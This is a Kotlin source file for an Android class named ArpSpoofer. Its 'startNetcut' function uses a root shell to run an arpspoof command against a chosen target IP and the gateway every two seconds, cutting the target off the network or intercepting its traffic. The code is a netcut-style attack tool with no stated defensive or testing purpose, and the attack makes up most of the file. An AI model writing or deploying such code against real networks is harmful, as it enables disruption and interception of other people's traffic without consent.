package com.example.wifitracer

import eu.chainfire.libsuperuser.Shell
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit

class ArpSpoofer {

    private val scheduler: ScheduledExecutorService = Executors.newScheduledThreadPool(10)
    private val activeTasks = mutableMapOf<String, Boolean>()

    fun startNetcut(targetIp: String, gatewayIp: String, interfaceName: String) {
        if (activeTasks[targetIp] == true) return
        activeTasks[targetIp] = true

        scheduler.scheduleAtFixedRate({
            if (activeTasks[targetIp] == true) {
                // Send ARP spoofing packet to target
                // We use root shell to send the packet
                // A common way is using 'arpspoof' or 'netcut' binary if available
                // Or manual packet sending via root shell
                // For demonstration, we'll use a shell command pattern
                
                // Example using a hypothetical 'arpspoof' binary on the device
                Shell.SU.run("arpspoof -i $interfaceName -t $targetIp $gatewayIp")
            }
        }, 0, 2, TimeUnit.SECONDS)
    }

    fun stopNetcut(targetIp: String) {
        activeTasks[targetIp] = false
    }

    fun isRooted(): Boolean {
        return Shell.SU.available()
    }
}
